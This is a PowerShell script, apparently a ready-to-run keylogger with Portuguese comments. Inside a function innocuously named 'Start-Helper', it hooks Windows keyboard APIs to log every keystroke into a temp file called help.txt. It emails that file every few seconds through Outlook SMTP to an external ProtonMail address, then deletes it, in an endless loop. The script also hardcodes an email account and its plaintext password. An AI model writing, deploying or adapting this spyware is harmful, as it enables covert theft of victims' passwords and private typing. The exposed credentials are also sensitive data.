$TimesToRun = 6000
$RunTimeP = 0.1    # Tempo em minutos
$From = "luccasmachado001@outlook.com"
$Pass = "hbzgnuqauqooxcbq"
$To = "carlosalberto58@protonmail.com"
$Subject = "pragmatica"
$body = "report"
$SMTPServer = "smtp-mail.outlook.com"    # Servidor SMTP do Outlook
$SMTPPort = "587"
$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)

function Start-Helper($Path="$env:temp\help.txt") {
    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    $null = New-Item -Path $Path -ItemType File -Force

    try {
        while ($true) {
            $Runner = 0
            while ($TimesToRun -ge $Runner) {
                $TimeStart = Get-Date
                $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
                while ($TimeEnd -ge (Get-Date)) {
                    Start-Sleep -Milliseconds 40
                    for ($ascii = 9; $ascii -le 254; $ascii++) {
                        $state = $API::GetAsyncKeyState($ascii)
                        if ($state -eq -32767) {
                            $null = [console]::CapsLock
                            $virtualKey = $API::MapVirtualKey($ascii, 3)
                            $kbstate = New-Object Byte[] 256
                            $checkkbstate = $API::GetKeyboardState($kbstate)
                            $mychar = New-Object -TypeName System.Text.StringBuilder
                            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                            if ($success) {
                                [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                            }
                        }
                    }
                }
                send-mailmessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
                Remove-Item -Path $Path -Force
                $Runner++
            }
        }
    }
    finally {
        # Removido o exit 1 para evitar o fechamento do PowerShell
    }
}

Start-Helper
